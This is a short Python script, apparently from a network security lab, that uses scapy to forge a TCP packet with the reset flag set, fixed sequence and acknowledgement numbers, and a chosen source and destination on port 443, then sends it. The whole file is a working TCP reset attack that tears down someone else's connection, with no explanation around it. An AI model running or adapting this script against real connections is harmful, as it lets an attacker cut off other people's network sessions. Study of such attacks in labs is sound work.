#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.6", dst="172.217.5.78")
tcp = TCP(sport=58968, dport=443, flags=0x04, seq=97259999, ack=517020)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

